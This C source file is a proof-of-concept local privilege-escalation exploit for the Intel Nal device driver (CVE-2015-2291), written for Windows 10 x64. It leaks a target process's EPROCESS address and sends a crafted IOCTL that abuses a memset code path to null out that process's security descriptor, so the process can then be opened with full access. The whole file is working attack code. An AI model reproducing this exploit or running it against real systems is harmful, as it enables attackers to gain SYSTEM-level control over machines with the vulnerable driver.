#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_nal = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0), h_system_priv_process = 0;
	unsigned char unused = 0, pid_input[10];
	unsigned long long eprocess_address = 0;
	unsigned long target_process_id = 0;

	RtlSecureZeroMemory(&pid_input, sizeof(pid_input));

	SetConsoleTitleA("CVE-2015-2291");

	printf("[*] CVE-2015-2291 Intel Nal Device Driver Exploit\n[*] Exploit tested on Windows 10 20H2 x64 Build 19042.1110\n[*] Written by ExAllocatePool2\n[!] Lets exploit!\n[>] Enter your target process ID to spawn a shell as... ");
	gets_s(&pid_input, sizeof(pid_input));
	target_process_id = atoi(&pid_input);
	printf("[*] Target Process ID: %d (0x%x)", target_process_id, target_process_id);

	h_system_priv_process = OpenProcess(PROCESS_ALL_ACCESS, 0, target_process_id);
	if (!h_system_priv_process)
	{
		printf("\n[-] Failed to obtain a handle to the target process.\n[!] Time to exploit the device driver...");
	}
	else
	{
		printf("\n[+] The target process security descriptor was already overwritten.\n[*] Skipping device driver exploitation phase...");
		spawn_system_shell(h_system_priv_process, target_process_id);
		return 0;
	}

	if (h_nal == (HANDLE)-1)
	{
		printf("\n[-] Unable to obtain a driver handle to the Nal device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a driver handle to the Nal device driver. Handle Value: 0x%p", h_nal);

	eprocess_address = leak_eprocess_pointer(target_process_id);
	if (!eprocess_address)
	{
		return 1;
	}

	trigger_vulnerability(h_nal, eprocess_address);
	if (spawn_system_shell(0, target_process_id))
	{
		return 1;
	}

	printf("\n[+] Exploit completed.");
	unused = getchar();
	return 0;
}

void trigger_vulnerability(HANDLE h_nal, unsigned long long eprocess)
{
	INPUT_BUFFER input_struct;
	unsigned char output[2048];
	unsigned long bytes_returned = 0;

	RtlSecureZeroMemory(&input_struct, sizeof(input_struct));
	RtlSecureZeroMemory(&output, sizeof(output));

	input_struct.JumpTableCode = 0x30;									// Hit the fully-controlled memset function code-path.
	input_struct.Destination = eprocess - 0x30 + 0x28;					// NULL out the target process' security descriptor.
	input_struct.Length = 0x8 + 0x7;									// We need to adjust the length parameter by adding 0x7 to get the length we want.
	input_struct.Value = 0x00;											// Only one byte counts in this scenario.

	printf("\n[+] Crafted input structure.\n<---------------- | Entering Danger Zone | ---------------->\n[!] Triggering vulnerability...");
	Sleep(3000);

	DebugBreak();
	DeviceIoControl(h_nal, TARGET_IOCTL, &input_struct, sizeof(input_struct), &output, sizeof(output), &bytes_returned, 0);
	DebugBreak();
	printf("\n[+] Overwrote the target process' security descriptor pointer.\n<---------------- | Leaving Danger Zone | ---------------->");

	return;
}

int spawn_system_shell(HANDLE h_process, unsigned long process_id)
{
	unsigned char unused = 0;

	if (!h_process)
	{
		h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
		if (!h_process)
		{
			printf("\n[-] Failed to obtain a handle to the target process. Error: %d (0x%x)", GetLastError(), GetLastError());
			unused = getchar();
			return 1;
		}
	}
	printf("\n[+] Obtained a handle to the target process. Handle Value: 0x%p", h_process);

	return 0;
}